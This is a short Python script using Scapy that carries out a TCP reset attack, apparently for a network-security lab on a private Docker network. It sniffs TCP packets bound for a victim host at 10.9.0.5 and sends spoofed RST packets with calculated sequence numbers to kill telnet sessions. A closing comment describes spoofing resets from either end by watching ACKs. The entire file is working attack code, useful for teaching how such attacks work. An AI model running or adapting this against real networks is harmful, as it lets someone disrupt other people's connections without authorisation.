from scapy.all import *

def rstfunc(pkt):
    ip = IP(src=pkt['IP'].src, dst=pkt['IP'].dst)
    len_pkt = 0 if not pkt['TCP'].payload else len(pkt['TCP'].payload.load)
    tcp = TCP(sport=pkt['TCP'].sport, dport=23, flags="R", seq=(pkt['TCP'].seq + len_pkt))
    pkt = ip/tcp
    ls(pkt)
    send(pkt, verbose=0)

f = "tcp and not ether src 02:42:fa:a7:22:45 and dst host 10.9.0.5" # Excluding our own generated packets and only considering destination as victim's IP.
pkt = sniff(iface="br-fa4ab2f34bed", filter=f, prn=rstfunc)

'''
Another approach that could be used, was to listen for ACKs sent by the victim to discover the SEQ number of the client's next message
and then spoof a RST packet from the client to the server. Or vice-versa. The RST packet can be send from both ends of the connection.
In this script, also to simplify the understanding of the log, we only send a spoofed packet from the client.
'''